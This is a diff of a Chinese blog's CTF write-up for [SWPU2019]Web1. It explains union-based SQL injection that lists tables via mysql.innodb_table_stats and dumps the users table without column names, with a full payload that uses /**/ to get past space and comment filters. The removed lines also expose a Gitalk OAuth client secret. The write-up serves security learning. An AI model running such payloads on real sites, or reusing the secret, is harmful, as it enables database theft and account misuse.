@@ -1,554 +1,179 @@
-<!DOCTYPE html>
-<html lang="zh-CN">
-<head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
-<meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 4.2.1">
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/tu.ico">
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/tu.ico">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/tu.ico">
-  <link rel="mask-icon" href="/images/tu.ico" color="#222">
-
-<link rel="stylesheet" href="/css/main.css">
-
-
-<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
-  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
-
-<script id="hexo-configurations">
-    var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"mayi077.github.io","root":"/","scheme":"Mist","version":"7.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":"ture","show_result":"ture","style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":"ture"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":"ture","mediumzoom":false,"lazyload":"ture","pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":3,"unescape":"ture","preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
-  </script>
-
-  <meta name="description" content="前言：这题主要考查了，无列名注入和mysql.innodb_table_stats用于报表名。 【这里有其它报表名方法】 用mysql.innodb_table_stats报表名详细说明select group_concat(table_name) from mysql.innodb_table_stats 此payload可以报表名。 无列名注入参考链接举个例子： 1234select 1,2,">
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>[SWPU2019]Web1 | 信安小蚂蚁</title><meta name="author" content="信安小蚂蚁"><meta name="copyright" content="信安小蚂蚁"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前言：这题主要考查了，无列名注入和mysql.innodb_table_stats用于报表名。 【这里有其它报表名方法】 用mysql.innodb_table_stats报表名详细说明select group_concat(table_name) from mysql.innodb_table_stats 此payload可以报表名。 无列名注入参考链接举个例子： 1234select 1,2,">
 <meta property="og:type" content="article">
 <meta property="og:title" content="[SWPU2019]Web1">
 <meta property="og:url" content="https://mayi077.github.io/2020/02/10/SWPU2019-Web1/index.html">
 <meta property="og:site_name" content="信安小蚂蚁">
 <meta property="og:description" content="前言：这题主要考查了，无列名注入和mysql.innodb_table_stats用于报表名。 【这里有其它报表名方法】 用mysql.innodb_table_stats报表名详细说明select group_concat(table_name) from mysql.innodb_table_stats 此payload可以报表名。 无列名注入参考链接举个例子： 1234select 1,2,">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://mayi077.github.io/images/1.jpg">
 <meta property="article:published_time" content="2020-02-10T06:10:42.000Z">
 <meta property="article:modified_time" content="2020-03-24T13:48:50.000Z">
 <meta property="article:author" content="信安小蚂蚁">
-<meta property="article:tag" content="基础积累">
 <meta property="article:tag" content="buuctf">
+<meta property="article:tag" content="基础积累">
 <meta property="article:tag" content="SQL注入">
 <meta name="twitter:card" content="summary">
-
-<link rel="canonical" href="https://mayi077.github.io/2020/02/10/SWPU2019-Web1/">
-
-
-<script id="page-configurations">
-  // https://hexo.io/docs/variables.html
-  CONFIG.page = {
-    sidebar: "",
-    isHome: false,
-    isPost: true
-  };
-</script>
-
-  <title>[SWPU2019]Web1 | 信安小蚂蚁</title>
-  
-
-
-
-
-
-
-  <noscript>
-  <style>
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-header { opacity: initial; }
-
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
-  }
-
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
-
-</head>
-
-<body itemscope itemtype="http://schema.org/WebPage">
-  <div class="container use-motion">
-    <div class="headband"></div>
-
-    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-container">
-  <div class="site-nav-toggle">
-    <div class="toggle" aria-label="切换导航栏">
-      <span class="toggle-line toggle-line-first"></span>
-      <span class="toggle-line toggle-line-middle"></span>
-      <span class="toggle-line toggle-line-last"></span>
-    </div>
-  </div>
-
-  <div class="site-meta">
-
-    <div>
-      <a href="/" class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">信安小蚂蚁</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
-    </div>
-  </div>
-
-  <div class="site-nav-right"></div>
-</div>
-
-
-<nav class="site-nav">
-  
-  <ul id="menu" class="menu">
-        <li class="menu-item menu-item-主页">
-
-    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>主页</a>
-
-  </li>
-        <li class="menu-item menu-item-归档">
-
-    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
-
-  </li>
-        <li class="menu-item menu-item-分类">
-
-    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
-
-  </li>
-        <li class="menu-item menu-item-标签">
-
-    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
-
-  </li>
-        <li class="menu-item menu-item-关于">
-
-    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
-
-  </li>
-      <li class="menu-item menu-item-search">
-        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
-        </a>
-      </li>
-  </ul>
-
-</nav>
-  <div class="site-search">
-    <div class="popup search-popup">
-    <div class="search-header">
-  <span class="search-icon">
-    <i class="fa fa-search"></i>
-  </span>
-  <div class="search-input-container">
-    <input autocomplete="off" autocorrect="off" autocapitalize="off"
-           placeholder="搜索..." spellcheck="false"
-           type="search" class="search-input">
-  </div>
-  <span class="popup-btn-close">
-    <i class="fa fa-times-circle"></i>
-  </span>
-</div>
-<div id="search-result"></div>
-
-</div>
-<div class="search-pop-overlay"></div>
-
-  </div>
-</div>
-    </header>
-
-    
-  <div class="back-to-top">
-    <i class="fa fa-arrow-up"></i>
-    <span>0%</span>
-  </div>
-
-
-    <main class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          
-
-          <div class="content">
-            
-
-  <div class="posts-expand">
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://mayi077.github.io/2020/02/10/SWPU2019-Web1/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/1.jpg">
-      <meta itemprop="name" content="信安小蚂蚁">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="信安小蚂蚁">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          [SWPU2019]Web1
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2020-02-10 14:10:42" itemprop="dateCreated datePublished" datetime="2020-02-10T14:10:42+08:00">2020-02-10</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-03-24 21:48:50" itemprop="dateModified" datetime="2020-03-24T21:48:50+08:00">2020-03-24</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index">
-                    <span itemprop="name">CTF复现</span>
-                  </a>
-                </span>
-            </span>
-
-          
-            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-eye"></i>
-              </span>
-              <span class="post-meta-item-text">阅读次数：</span>
-              <span id="busuanzi_value_page_pv"></span>
-            </span><br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-file-word-o"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>1.2k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-clock-o"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>3 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-        <h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>这题主要考查了，无列名注入和mysql.innodb_table_stats用于报表名。 <a href="https://osandamalith.com/2020/01/27/alternatives-to-extract-tables-and-columns-from-mysql-and-mariadb/" target="_blank" rel="noopener">【这里有其它报表名方法】</a></p>
-<h3 id="用mysql-innodb-table-stats报表名"><a href="#用mysql-innodb-table-stats报表名" class="headerlink" title="用mysql.innodb_table_stats报表名"></a>用mysql.innodb_table_stats报表名</h3><p><a href="https://mariadb.com/kb/en/mysqlinnodb_table_stats/" target="_blank" rel="noopener">详细说明</a><br><code>select group_concat(table_name) from mysql.innodb_table_stats</code> 此payload可以报表名。</p>
-<h3 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h3><p><a href="https://blog.csdn.net/chasingin/article/details/103476001" target="_blank" rel="noopener">参考链接</a><br>举个例子：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3 union select * from users;</span><br><span class="line">&#x2F;&#x2F; 使用这个语句，前面的select 1，2，3 会变成列名。如果此时我们再使用下面的语句</span><br><span class="line">slecet 2 form (select 1,2,3 union select * from users)a; </span><br><span class="line">&#x2F;&#x2F; 就可以得到我们的第二列的所有数据</span><br></pre></td></tr></table></figure>
-
-<h3 id="下面再来分析以下此题的payload"><a href="#下面再来分析以下此题的payload" class="headerlink" title="下面再来分析以下此题的payload"></a>下面再来分析以下此题的payload</h3><p>对了，值得注意的是这题过滤了注释符，所以我们用<code>&#39;</code>来闭合语句。然后也过滤了空格，我们用/**/代替。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(a)&#x2F;**&#x2F;from(select&#x2F;**&#x2F;1,2,3&#x2F;**&#x2F;as&#x2F;**&#x2F;a&#x2F;**&#x2F;union&#x2F;**&#x2F;select*from&#x2F;**&#x2F;users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x2F;**&#x2F;&#39;</span><br></pre></td></tr></table></figure>
-
-<p>&emsp;首先我们发现总共有22个字段且第二个字段可以回显给我们，所以第二个字段突破。<br>&emsp;第二个字段的内容为</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(select group_concat(a) from (select 1,2,3 as a union select*from users)x)</span><br></pre></td></tr></table></figure>
-<p>我们可以知道这里用了2种重命名方式，第一种是as 后面接别名，第二种是（）后面接别名。而group_concat只是为了把想要数据全部显示出来（一行）。  </p>
-<p>&emsp;<code>(select 1,2,3 as a union select*from users)</code>这里的第一个select就是给它们的列重命名，union后面就是得到一个重命名后的数据表，然后取别名为<code>x</code>。<br>&emsp;最后相当于<code>select group_concat(1,2,3) form x</code>从而把整个表里的数据回显。<br><strong>注：sql中过滤了 * 号。在无列名注入的时候 一定要和表的列数相同，不然会报错 。</strong><br><strong>改：</strong> <code>select 1,2,3 as a</code> 只会把第3列重名为 a 。这次测试中必须要给重名一个列重命名否者无法正确读取数据 – 2020/3/11（mysql 5.5.53）</p>
-
-    </div>
-
-    
-    
-    
-        
-
-<div>
-<ul class="post-copyright">
-  <li class="post-copyright-author">
-    <strong>本文作者： </strong>信安小蚂蚁
-  </li>
-  <li class="post-copyright-link">
-    <strong>本文链接：</strong>
-    <a href="https://mayi077.github.io/2020/02/10/SWPU2019-Web1/" title="[SWPU2019]Web1">https://mayi077.github.io/2020/02/10/SWPU2019-Web1/</a>
-  </li>
-  <li class="post-copyright-license">
-    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/publicdomain/zero/1.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>ZERO</a> 许可协议。转载请注明出处！
-  </li>
-</ul>
-</div>
-
-     <div>
-       
-         ﻿<div>
-    
-        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
-    
-</div>
-         
-      </div>
-
-
-      <footer class="post-footer">
-          <div class="post-tags">
-              <a href="/tags/%E5%9F%BA%E7%A1%80%E7%A7%AF%E7%B4%AF/" rel="tag"><i class="fa fa-tag"></i>基础积累</a>
-              <a href="/tags/buuctf/" rel="tag"><i class="fa fa-tag"></i>buuctf</a>
-              <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag"><i class="fa fa-tag"></i>SQL注入</a>
-          </div>
-
-        
-
-
-        
-    <div class="post-nav">
-      <div class="post-nav-item">
-    <a href="/2020/02/10/GXYCTF2019-Ping-Ping-Ping/" rel="prev" title="[GXYCTF2019]Ping Ping Ping">
-      <i class="fa fa-chevron-left"></i> [GXYCTF2019]Ping Ping Ping
-    </a></div>
-      <div class="post-nav-item">
-    <a href="/2020/02/14/SUCTF-2019-EasyWeb/" rel="next" title="[SUCTF 2019]EasyWeb">
-      [SUCTF 2019]EasyWeb <i class="fa fa-chevron-right"></i>
-    </a></div>
-    </div>
-      </footer>
-    
-  </article>
-  
-  
-  
-
-  </div>
-
-
-          </div>
-          
-    <div class="comments" id="gitalk-container"></div>
-
-<script>
-  window.addEventListener('tabs:register', () => {
-    let activeClass = CONFIG.comments.activeClass;
-    if (CONFIG.comments.storage) {
-      activeClass = localStorage.getItem('comments_active') || activeClass;
+<meta name="twitter:image" content="https://mayi077.github.io/images/1.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "[SWPU2019]Web1",
+  "url": "https://mayi077.github.io/2020/02/10/SWPU2019-Web1/",
+  "image": "https://mayi077.github.io/images/1.jpg",
+  "datePublished": "2020-02-10T06:10:42.000Z",
+  "dateModified": "2020-03-24T13:48:50.000Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "信安小蚂蚁",
+      "url": "https://mayi077.github.io"
     }
-    if (activeClass) {
-      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
-      if (activeTab) {
-        activeTab.click();
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://mayi077.github.io/2020/02/10/SWPU2019-Web1/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.5-b1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
       }
     }
-  });
-  if (CONFIG.comments.storage) {
-    window.addEventListener('tabs:click', event => {
-      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
-      let commentClass = event.target.classList[1];
-      localStorage.setItem('comments_active', commentClass);
-    });
-  }
-</script>
 
-        </div>
-          
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
   
-  <div class="toggle sidebar-toggle">
-    <span class="toggle-line toggle-line-first"></span>
-    <span class="toggle-line toggle-line-middle"></span>
-    <span class="toggle-line toggle-line-last"></span>
-  </div>
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
 
-  <aside class="sidebar">
-    <div class="sidebar-inner">
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
 
-      <ul class="sidebar-nav motion-element">
-        <li class="sidebar-nav-toc">
-          文章目录
-        </li>
-        <li class="sidebar-nav-overview">
-          站点概览
-        </li>
-      </ul>
-
-      <!--noindex-->
-      <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言："><span class="nav-number">1.</span> <span class="nav-text">前言：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#用mysql-innodb-table-stats报表名"><span class="nav-number">2.</span> <span class="nav-text">用mysql.innodb_table_stats报表名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#无列名注入"><span class="nav-number">3.</span> <span class="nav-text">无列名注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#下面再来分析以下此题的payload"><span class="nav-number">4.</span> <span class="nav-text">下面再来分析以下此题的payload</span></a></li></ol></div>
-      </div>
-      <!--/noindex-->
-
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <img class="site-author-image" itemprop="image" alt="信安小蚂蚁"
-      src="/images/1.jpg">
-  <p class="site-author-name" itemprop="name">信安小蚂蚁</p>
-  <div class="site-description" itemprop="description"></div>
-</div>
-<div class="site-state-wrap motion-element">
-  <nav class="site-state">
-      <div class="site-state-item site-state-posts">
-          <a href="/archives">
-          <span class="site-state-item-count">135</span>
-          <span class="site-state-item-name">日志</span>
-        </a>
-      </div>
-      <div class="site-state-item site-state-categories">
-            <a href="/categories/">
-        <span class="site-state-item-count">11</span>
-        <span class="site-state-item-name">分类</span></a>
-      </div>
-      <div class="site-state-item site-state-tags">
-            <a href="/tags/">
-        <span class="site-state-item-count">86</span>
-        <span class="site-state-item-name">标签</span></a>
-      </div>
-  </nav>
-</div>
-  <div class="links-of-author motion-element">
-      <span class="links-of-author-item">
-        <a href="/487280636@qq.com" title="E-Mail → 487280636@qq.com"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
-      </span>
-      <span class="links-of-author-item">
-        <a href="http://wpa.qq.com/msgrd?v=3&uin=487280636&site=qq&menu=yes" title="QQ → http:&#x2F;&#x2F;wpa.qq.com&#x2F;msgrd?v&#x3D;3&amp;uin&#x3D;487280636&amp;site&#x3D;qq&amp;menu&#x3D;yes" rel="noopener" target="_blank"><i class="fa fa-fw fa-instagram"></i>QQ</a>
-      </span>
-  </div>
-  <div class="cc-license motion-element" itemprop="license">
-    <a href="https://creativecommons.org/publicdomain/zero/1.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-zero.svg" alt="Creative Commons"></a>
-  </div>
-
-
-
-      </div>
-
-    </div>
-  </aside>
-  <div id="sidebar-dimmer"></div>
-
-
-      </div>
-    </main>
-
-    <footer class="footer">
-      <div class="footer-inner">
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
         
-
-<div class="copyright">
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
   
-  &copy; 
-  <span itemprop="copyrightYear">2026</span>
-  <span class="with-love">
-    <i class="fa fa-user"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">信安小蚂蚁</span>
-</div>
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '[SWPU2019]Web1',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 5.4.0"></head><body><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">信安小蚂蚁</span></a><a class="nav-page-title" href="/"><span class="site-name">[SWPU2019]Web1</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">[SWPU2019]Web1</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-02-10T06:10:42.000Z" title="发表于 2020-02-10 14:10:42">2020-02-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2020-03-24T13:48:50.000Z" title="更新于 2020-03-24 21:48:50">2020-03-24</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E5%A4%8D%E7%8E%B0/">CTF复现</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>这题主要考查了，无列名注入和mysql.innodb_table_stats用于报表名。 <a target="_blank" rel="noopener" href="https://osandamalith.com/2020/01/27/alternatives-to-extract-tables-and-columns-from-mysql-and-mariadb/">【这里有其它报表名方法】</a></p>
+<h3 id="用mysql-innodb-table-stats报表名"><a href="#用mysql-innodb-table-stats报表名" class="headerlink" title="用mysql.innodb_table_stats报表名"></a>用mysql.innodb_table_stats报表名</h3><p><a target="_blank" rel="noopener" href="https://mariadb.com/kb/en/mysqlinnodb_table_stats/">详细说明</a><br><code>select group_concat(table_name) from mysql.innodb_table_stats</code> 此payload可以报表名。</p>
+<h3 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/chasingin/article/details/103476001">参考链接</a><br>举个例子：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3 union select * from users;</span><br><span class="line">// 使用这个语句，前面的select 1，2，3 会变成列名。如果此时我们再使用下面的语句</span><br><span class="line">slecet 2 form (select 1,2,3 union select * from users)a; </span><br><span class="line">// 就可以得到我们的第二列的所有数据</span><br></pre></td></tr></table></figure>
 
+<h3 id="下面再来分析以下此题的payload"><a href="#下面再来分析以下此题的payload" class="headerlink" title="下面再来分析以下此题的payload"></a>下面再来分析以下此题的payload</h3><p>对了，值得注意的是这题过滤了注释符，所以我们用<code>&#39;</code>来闭合语句。然后也过滤了空格，我们用/**/代替。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;/**/union/**/select/**/1,(select/**/group_concat(a)/**/from(select/**/1,2,3/**/as/**/a/**/union/**/select*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#x27;</span><br></pre></td></tr></table></figure>
 
-
-
-
-
-
-
-
-        
-<div class="busuanzi-count">
-  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-</div>
-
-
-
-
-
-
-
-
-      </div>
-    </footer>
-  </div>
-
-  
-  <script src="/lib/anime.min.js"></script>
-  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
-  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
-  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
-  <script src="/lib/velocity/velocity.min.js"></script>
-  <script src="/lib/velocity/velocity.ui.min.js"></script>
-
-<script src="/js/utils.js"></script>
-
-<script src="/js/motion.js"></script>
-
-
-<script src="/js/schemes/muse.js"></script>
-
-
-<script src="/js/next-boot.js"></script>
-
-
-
-
-  
-
-
-
-
-  
-<script src="/js/local-search.js"></script>
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-  
-
-<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1.8.0/dist/gitalk.min.css">
-
-<script>
-NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
-  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1.8.0/dist/gitalk.min.js', () => {
-    var gitalk = new Gitalk({
-      clientID    : 'Ov23li6cOHoOwCcszzi9',
-      clientSecret: '8f2a2156cf47355ba518edf71e62d5e1618dc229',
-      repo        : 'mayi077.github.io',
-      owner       : 'mayi077',
-      admin       : ['mayi077'],
-      id          : '81c1b248b59a35424ca593fea24ac9d1',
-        language: 'zh-CN',
-      distractionFreeMode: true,
-      enablePKCE: true
-    });
-    gitalk.render('gitalk-container');
-  }, window.Gitalk);
-});
-</script>
-
-</body>
-</html>
+<p>&emsp;首先我们发现总共有22个字段且第二个字段可以回显给我们，所以第二个字段突破。<br>&emsp;第二个字段的内容为</p>
+<p><del>~<br>(select group_concat(a) from (select 1,2,3 as a union select*from users)x)</del><br>我们可以知道这里用了2种重命名方式，第一种是as 后面接别名，第二种是（）后面接别名。而group_concat只是为了把想要数据全部显示出来（一行）。  </p>
